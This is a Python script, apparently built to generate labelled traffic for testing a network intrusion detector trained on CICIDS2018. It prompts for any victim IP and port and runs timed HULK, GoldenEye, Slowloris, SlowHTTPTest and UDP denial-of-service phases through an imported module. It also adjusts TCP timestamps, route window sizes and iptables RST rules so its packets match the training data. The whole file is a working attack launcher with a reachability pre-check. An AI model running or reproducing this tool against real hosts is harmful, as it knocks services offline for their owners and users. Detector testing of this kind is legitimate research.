#!/usr/bin/env python
"""
DoS Attack CLI — Interactive Mode
Asks for target IP, HTTP port, and duration at runtime.

Currently supports DoS only (Hulk, Slowloris, GoldenEye, SlowHTTPTest, UDP).
Other attack types will be added later.

Usage:
    python device_attack.py                  # Interactive: prompts for IP + port
    python device_attack.py --duration 300   # 5-minute attack
    python device_attack.py --help           # Show options
"""

import sys
import os
import time
import re
import argparse
import socket
import platform
import subprocess

# Add current directory to path so _1_dos_attack can be imported
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

DEFAULTS = {"duration": 300}


# ─── TCP Timestamps ──────────────────────────────────────
def check_and_enable_tcp_timestamps():
    """Check and enable TCP timestamps on the attacker machine.

    CRITICAL for classification accuracy:
    - Fwd Seg Size Min is the #1 feature (9.3% importance)
    - CICIDS2018 training data had TCP timestamps ON (Linux/Kali)
    - Timestamps add 12 bytes to TCP header: 20 → 32
    - Without them Fwd Seg Size Min = 20, model expects 32 → misclassified
    """
    os_name = platform.system()

    if os_name == "Windows":
        print("[*] Checking TCP timestamps (CRITICAL for classification)...")
        try:
            result = subprocess.run(
                ["netsh", "int", "tcp", "show", "global"],
                capture_output=True, text=True, timeout=10,
            )
            output = result.stdout.lower()

            if "timestamps" in output and "enabled" in output:
                print("[OK] TCP timestamps are ENABLED\n")
                return True

            print("[!] TCP timestamps appear DISABLED — attempting to enable...")
            try:
                r = subprocess.run(
                    ["netsh", "int", "tcp", "set", "global", "timestamps=enabled"],
                    capture_output=True, text=True, timeout=10,
                )
                if r.returncode == 0:
                    print("[OK] TCP timestamps ENABLED successfully!\n")
                    return True
                else:
                    print("[!] Failed (need Administrator). Run manually:")
                    print("    netsh int tcp set global timestamps=enabled\n")
                    return False
            except Exception as e:
                print(f"[!] Error enabling timestamps: {e}")
                print("    netsh int tcp set global timestamps=enabled\n")
                return False

        except Exception as e:
            print(f"[!] Error checking timestamps: {e}")
            print("    netsh int tcp set global timestamps=enabled\n")
            return False

    elif os_name == "Linux":
        try:
            with open("/proc/sys/net/ipv4/tcp_timestamps", "r") as f:
                val = f.read().strip()
            if val == "1":
                print("[OK] TCP timestamps are enabled (Linux)\n")
                return True
            print("[!] Enabling TCP timestamps...")
            os.system("sudo sysctl -w net.ipv4.tcp_timestamps=1")
            return True
        except Exception:
            print("[?] Could not check TCP timestamps on Linux\n")
            return True

    return True


# ─── TCP Window Fix (Linux) ──────────────────────────────
_ROUTE_MODIFIED = False
_ORIGINAL_ROUTE_DEV = None
_ROUTE_CMD_BASE = None  # Cached route command base for quick window changes


def setup_tcp_window(target_ip, window=225):
    """On Linux, set `ip route ... window <window>` so SYN packets advertise
    the specified Init Fwd Win Byts value.

    CICIDS2018 training data window values per technique:
      HULK:         225   (75% of flows)
      GoldenEye:    26883
      Slowloris:    26883
      SlowHTTPTest: 26883

    The ip route window parameter caps the TCP SYN window advertisement,
    bypassing the Linux SO_RCVBUF minimum (~2304 bytes).
    """
    global _ROUTE_MODIFIED, _ORIGINAL_ROUTE_DEV, _ROUTE_CMD_BASE

    if platform.system() != "Linux":
        return True  # Not needed on Windows (SO_RCVBUF works as expected)

    print(f"\n[*] ── TCP Window Configuration (Linux) ──────────")
    print(f"[*] Setting Init Fwd Win Byts = {window} for connections to {target_ip}")

    try:
        # 1. Get current route to determine the network interface
        result = subprocess.run(
            ["ip", "route", "get", target_ip],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode != 0:
            print(f"[!!] Failed to get route: {result.stderr.strip()}")
            return False

        route_output = result.stdout.strip()
        print(f"[*] Current route: {route_output}")

        # Parse the device from "... dev <iface> ..."
        dev_match = re.search(r'\bdev\s+(\S+)', route_output)
        if not dev_match:
            print(f"[!!] Could not parse network interface from route")
            return False

        iface = dev_match.group(1)
        _ORIGINAL_ROUTE_DEV = iface

        # Parse optional gateway
        via_match = re.search(r'\bvia\s+(\S+)', route_output)
        gateway = via_match.group(1) if via_match else None

        # 2. Build and cache the route command base (reused by change_tcp_window)
        _ROUTE_CMD_BASE = ["ip", "route", "replace", f"{target_ip}/32"]
        if gateway:
            _ROUTE_CMD_BASE += ["via", gateway]
        _ROUTE_CMD_BASE += ["dev", iface]

        # 3. Set the route with the specified window
        cmd = _ROUTE_CMD_BASE + ["window", str(window)]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        if result.returncode != 0:
            print(f"[!!] Failed to set route: {result.stderr.strip()}")
            print(f"[!!] Command: {' '.join(cmd)}")
            print(f"[!!] Need root/sudo to modify routes")
            return False

        _ROUTE_MODIFIED = True
        print(f"[OK] Route set: {' '.join(cmd)}")
        print(f"[*] ─────────────────────────────────────────────\n")
        return True

    except Exception as e:
        print(f"[!!] Error configuring TCP window: {e}")
        print(f"[*] ─────────────────────────────────────────────\n")
        return False


def change_tcp_window(target_ip, window):
    """Quick TCP window change using cached route info from setup_tcp_window.
    Falls back to full setup if cache is not available."""
    global _ROUTE_CMD_BASE, _ROUTE_MODIFIED

    if platform.system() != "Linux":
        return True

    if _ROUTE_CMD_BASE is None:
        return setup_tcp_window(target_ip, window)

    try:
        cmd = _ROUTE_CMD_BASE + ["window", str(window)]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        if result.returncode != 0:
            print(f"[!!] Failed to change window: {result.stderr.strip()}")
            return False

        _ROUTE_MODIFIED = True
        print(f"[OK] TCP window changed to {window}")
        return True
    except Exception as e:
        print(f"[!!] Error changing TCP window: {e}")
        return False


def restore_tcp_window(target_ip):
    """Remove the /32 host route added by setup_tcp_window."""
    global _ROUTE_MODIFIED, _ROUTE_CMD_BASE

    if not _ROUTE_MODIFIED:
        return

    if platform.system() != "Linux":
        return

    try:
        subprocess.run(
            ["ip", "route", "del", f"{target_ip}/32"],
            capture_output=True, text=True, timeout=5
        )
        _ROUTE_MODIFIED = False
        _ROUTE_CMD_BASE = None
        print(f"[OK] Restored original route (removed /32 override for {target_ip})")
    except Exception as e:
        print(f"[!] Could not restore route: {e}")
        print(f"[!] Manually run: ip route del {target_ip}/32")


# ─── iptables RST DROP (Linux) ───────────────────────────
# CRITICAL for RED classification: CICIDS2018 training HULK data has
# RST Flag Cnt = 0 for 100% of flows. Our SO_LINGER close sends RST,
# which CICFlowMeter records as RST=1 → model predicts YELLOW (44%)
# instead of RED (50%). Dropping outgoing RST via iptables makes the
# RST invisible to CICFlowMeter → RST Flag Cnt = 0 → RED.
_IPTABLES_RULE_ADDED = False
_IPTABLES_TARGET_IP = None
_IPTABLES_TARGET_PORT = None


def setup_iptables_drop_rst(target_ip, target_port=80):
    """Add iptables rule to DROP outgoing TCP RST to the victim.

    This prevents CICFlowMeter from seeing RST packets, matching
    CICIDS2018 training HULK data (RST Flag Cnt = 0 for 100% of flows).

    Without this rule: DoS probability ≈ 44% → YELLOW
    With this rule:    DoS probability ≈ 50% → RED

    Only needed on Linux. Windows doesn't support iptables.
    Requires root/sudo.
    """
    global _IPTABLES_RULE_ADDED, _IPTABLES_TARGET_IP, _IPTABLES_TARGET_PORT

    if platform.system() != "Linux":
        return True  # Not applicable on Windows

    print(f"\n[*] ── iptables RST DROP Configuration ────────────")
    print(f"[*] Dropping outgoing RST to {target_ip}:{target_port}")
    print(f"[*] Purpose: RST Flag Cnt must be 0 (matching training data)")

    # Check if rule already exists
    try:
        check_cmd = [
            "iptables", "-C", "OUTPUT", "-p", "tcp",
            "-d", target_ip, "--dport", str(target_port),
            "--tcp-flags", "RST", "RST", "-j", "DROP"
        ]
        result = subprocess.run(check_cmd, capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            print(f"[OK] iptables RST DROP rule already exists")
            _IPTABLES_RULE_ADDED = True
            _IPTABLES_TARGET_IP = target_ip
            _IPTABLES_TARGET_PORT = target_port
            print(f"[*] ─────────────────────────────────────────────\n")
            return True
    except Exception:
        pass

    # Add the rule
    try:
        add_cmd = [
            "iptables", "-A", "OUTPUT", "-p", "tcp",
            "-d", target_ip, "--dport", str(target_port),
            "--tcp-flags", "RST", "RST", "-j", "DROP"
        ]
        result = subprocess.run(add_cmd, capture_output=True, text=True, timeout=5)
        if result.returncode != 0:
            print(f"[!!] Failed to add iptables rule: {result.stderr.strip()}")
            print(f"[!!] Need root/sudo. Attack will still work but RST Flag Cnt = 1")
            print(f"[!!] Classification: YELLOW (44% DoS) instead of RED (50% DoS)")
            print(f"[*] ─────────────────────────────────────────────\n")
            return False

        _IPTABLES_RULE_ADDED = True
        _IPTABLES_TARGET_IP = target_ip
        _IPTABLES_TARGET_PORT = target_port
        print(f"[OK] iptables: DROP outgoing RST to {target_ip}:{target_port}")
        print(f"[*] ─────────────────────────────────────────────\n")
        return True

    except Exception as e:
        print(f"[!!] iptables error: {e}")
        print(f"[!!] Manually run: iptables -A OUTPUT -p tcp -d {target_ip} "
              f"--dport {target_port} --tcp-flags RST RST -j DROP")
        print(f"[*] ─────────────────────────────────────────────\n")
        return False


def restore_iptables():
    """Remove the iptables RST DROP rule added by setup_iptables_drop_rst."""
    global _IPTABLES_RULE_ADDED, _IPTABLES_TARGET_IP, _IPTABLES_TARGET_PORT

    if not _IPTABLES_RULE_ADDED:
        return

    if platform.system() != "Linux":
        return

    try:
        del_cmd = [
            "iptables", "-D", "OUTPUT", "-p", "tcp",
            "-d", _IPTABLES_TARGET_IP,
            "--dport", str(_IPTABLES_TARGET_PORT),
            "--tcp-flags", "RST", "RST", "-j", "DROP"
        ]
        subprocess.run(del_cmd, capture_output=True, text=True, timeout=5)
        _IPTABLES_RULE_ADDED = False
        print(f"[OK] iptables RST DROP rule removed")
    except Exception as e:
        print(f"[!] Could not remove iptables rule: {e}")
        print(f"[!] Manually run: iptables -D OUTPUT -p tcp -d {_IPTABLES_TARGET_IP} "
              f"--dport {_IPTABLES_TARGET_PORT} --tcp-flags RST RST -j DROP")


# ─── Connectivity Pre-Check ──────────────────────────────
def check_connectivity(target_ip, target_port, timeout=5):
    """Try a single TCP connection to the victim BEFORE launching the attack.
    Returns True if connection succeeds, False otherwise.
    Prints clear diagnostic info so the user knows what went wrong.
    """
    print(f"\n[*] ── Connectivity Pre-Check ─────────────────────")
    print(f"[*] Testing TCP connection to {target_ip}:{target_port} ...")

    # 1. Quick ICMP-style reachability (ping)
    os_name = platform.system()
    ping_cmd = ["ping", "-n", "1", "-w", "2000", target_ip] if os_name == "Windows" \
        else ["ping", "-c", "1", "-W", "2", target_ip]
    try:
        ping_result = subprocess.run(ping_cmd, capture_output=True, text=True, timeout=5)
        if ping_result.returncode == 0:
            print(f"[OK] Ping to {target_ip} succeeded")
        else:
            print(f"[!!] Ping to {target_ip} FAILED — host may be unreachable or ICMP blocked")
            print(f"     (continuing anyway — ICMP may be blocked by firewall)")
    except Exception as e:
        print(f"[!!] Ping error: {e}")

    # 2. TCP connection test
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((target_ip, target_port))
        sock.close()
        print(f"[OK] TCP connect to {target_ip}:{target_port} SUCCEEDED")
        print(f"[*] ─────────────────────────────────────────────\n")
        return True
    except socket.timeout:
        print(f"[!!] TCP connect to {target_ip}:{target_port} TIMED OUT after {timeout}s")
        print(f"     Possible causes:")
        print(f"       - Target IP is wrong or host is down")
        print(f"       - Firewall is blocking port {target_port}")
        print(f"       - No service listening on port {target_port}")
    except ConnectionRefusedError:
        print(f"[!!] TCP connect to {target_ip}:{target_port} REFUSED")
        print(f"     The host is reachable but nothing is listening on port {target_port}")
        print(f"     Make sure an HTTP server is running on the victim")
    except OSError as e:
        print(f"[!!] TCP connect to {target_ip}:{target_port} FAILED: {e}")
        print(f"     Possible causes:")
        print(f"       - Target IP is wrong / host is down")
        print(f"       - Network not configured / no route to host")

    print(f"[*] ─────────────────────────────────────────────\n")

    # Ask user whether to continue anyway
    resp = input("[?] Connection failed. Continue with attack anyway? (y/N): ").strip().lower()
    return resp in ("y", "yes")


# ─── Import DoS module ───────────────────────────────────
from _1_dos_attack import run_dos


# ─── Prompts ─────────────────────────────────────────────
def prompt_for_ip():
    """Prompt user for target IP address."""
    while True:
        ip = input("\n[?] Enter target (victim) IP address: ").strip()
        if not ip:
            print("[-] IP cannot be empty")
            continue
        try:
            socket.inet_aton(ip)
            return ip
        except socket.error:
            print("[-] Invalid IP address format")


def prompt_for_port():
    """Prompt user for the HTTP target port (DoS only needs one port)."""
    while True:
        port_str = input("[?] Enter target HTTP port (default 80): ").strip()
        if not port_str:
            print("    -> Using default HTTP port: 80")
            return 80
        try:
            port = int(port_str)
            if 1 <= port <= 65535:
                print(f"    -> HTTP port set to: {port}")
                return port
            print("[-] Port must be between 1 and 65535")
        except ValueError:
            print("[-] Invalid port number")


# ─── Main ────────────────────────────────────────────────
def parse_args():
    parser = argparse.ArgumentParser(
        description="NIDS DoS Attack Generator — Interactive Mode",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument(
        "--duration", type=int, default=DEFAULTS["duration"],
        help=f"Attack duration in seconds (default: {DEFAULTS['duration']})",
    )
    parser.add_argument(
        "--threads", type=int, default=10,
        help="Number of attack threads (default: 10)",
    )
    return parser.parse_args()


def main():
    print("=" * 60)
    print("  NIDS Attack Generator — DoS (All Subtypes)")
    print("=" * 60)
    print()

    args = parse_args()

    # 1. TCP timestamps
    check_and_enable_tcp_timestamps()

    # 2. Target info
    target_ip = prompt_for_ip()
    target_port = prompt_for_port()

    # 3. Connectivity pre-check
    if not check_connectivity(target_ip, target_port):
        print("[-] Aborting — fix connectivity first.")
        sys.exit(1)

    total_duration = args.duration
    threads = args.threads

    # 4. Victim-side setup reminder
    print(f"\n[*] ── VICTIM-SIDE SETUP (CRITICAL) ────────────────")
    print(f"[*] For RED classification, the victim MUST have:")
    print(f"[*]   sudo ip route replace <YOUR_ATTACKER_IP>/32 dev <IFACE> window 219")
    print(f"[*]")
    print(f"[*] This makes the victim's SYN-ACK advertise window=219,")
    print(f"[*] matching the CICIDS2018 training victim (Ubuntu 16.04).")
    print(f"[*] Without this, attacks classify as YELLOW (DoS ~29%).")
    print(f"[*] With this,    attacks classify as RED    (DoS ~50%).")
    print(f"[*]")
    print(f"[*] Run setup_victim.py on the victim to configure this,")
    print(f"[*] or manually run the ip route command above on the victim.")
    print(f"[*] ────────────────────────────────────────────────")
    resp = input("[?] Is the victim TCP window configured? (y/N): ").strip().lower()
    if resp not in ("y", "yes"):
        print("[!] Continuing anyway — attacks may classify as YELLOW instead of RED")

    # ── Time allocation across phases ──
    # CICIDS2018 ran each tool separately with similar durations:
    #   HULK: 34 min (461K flows)  — needs Init Fwd Win Byts = 225
    #   GoldenEye: 43 min (41K)    — needs Init Fwd Win Byts = 26883
    #   Slowloris: 41 min          — needs Init Fwd Win Byts = 26883
    #   SlowHTTPTest: 56 min (91K) — needs Init Fwd Win Byts = 26883
    #
    # We use 2 phases because `ip route window` is per-destination:
    #   Phase 1: HULK only          (window=225)   — 50% of time
    #   Phase 2: GoldenEye+Slow*+UDP (window=26883) — 50% of time
    hulk_duration = int(total_duration * 0.50)
    others_duration = total_duration - hulk_duration

    print(f"\n[*] ── Attack Plan ──────────────────────────────────")
    print(f"[*] Target: {target_ip}:{target_port}")
    print(f"[*] Total duration: {total_duration}s | Threads: {threads}")
    print(f"[*]")
    print(f"[*] Phase 1: HULK             ({hulk_duration}s, window=225)")
    print(f"[*]   TCP connect + hold 13ms + send 1B + RST close")
    print(f"[*]   iptables DROP RST → CICFlowMeter sees RST=0")
    print(f"[*] Phase 2: Mixed            ({others_duration}s, window=26883)")
    print(f"[*]   GoldenEye + SlowHTTPTest + Slowloris + UDP")
    print(f"[*] ────────────────────────────────────────────────")
    print(f"[*] Press Ctrl+C to stop\n")

    total_conns = 0
    total_errs = 0

    try:
        # ── Setup: iptables RST DROP ─────────────────────────
        # Must be done BEFORE the attack so RST packets from
        # SO_LINGER close are invisible to CICFlowMeter.
        iptables_ok = setup_iptables_drop_rst(target_ip, target_port)
        if not iptables_ok:
            print("[!] iptables setup failed — RST Flag Cnt will be 1")
            print("[!] Flows may classify as YELLOW (44%) instead of RED (50%)")

        # ── Phase 1: HULK with window=225 ────────────────────
        print(f"\n{'='*55}")
        print(f"  PHASE 1 / 2 : HULK (window=225) — {hulk_duration}s")
        print(f"{'='*55}")
        setup_tcp_window(target_ip, window=225)
        conns, errs = run_dos(
            target_ip, target_port=target_port,
            duration=hulk_duration, threads=threads,
            techniques=['hulk'] * threads
        )
        total_conns += conns
        total_errs += errs

        # ── Phase 2: Mixed with window=26883 ─────────────────
        print(f"\n{'='*55}")
        print(f"  PHASE 2 / 2 : GoldenEye+SlowHTTPTest+Slowloris+UDP")
        print(f"  (window=26883) — {others_duration}s")
        print(f"{'='*55}")
        change_tcp_window(target_ip, window=26883)

        # Thread allocation for Phase 2:
        #   GoldenEye:    4T  (HTTP keep-alive flood, strong detection signal)
        #   SlowHTTPTest: 3T  (rapid micro-connections)
        #   Slowloris:    2T  (partial-header connection holding)
        #   UDP:          1T  (protocol diversity)
        phase2_techniques = (
            ['goldeneye'] * 4 +
            ['slowhttp'] * 3 +
            ['slowloris'] * 2 +
            ['udp'] * 1
        )
        conns, errs = run_dos(
            target_ip, target_port=target_port,
            duration=others_duration, threads=threads,
            techniques=phase2_techniques
        )
        total_conns += conns
        total_errs += errs

    except KeyboardInterrupt:
        print("\n[*] Attack interrupted by user")
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # Always restore iptables and route
        restore_iptables()
        restore_tcp_window(target_ip)

    print(f"\n{'='*55}")
    print(f"  DoS ATTACK COMPLETE")
    print(f"  Total: {total_conns} connections, {total_errs} errors")
    print(f"{'='*55}")


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n[FATAL ERROR] {str(e)}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
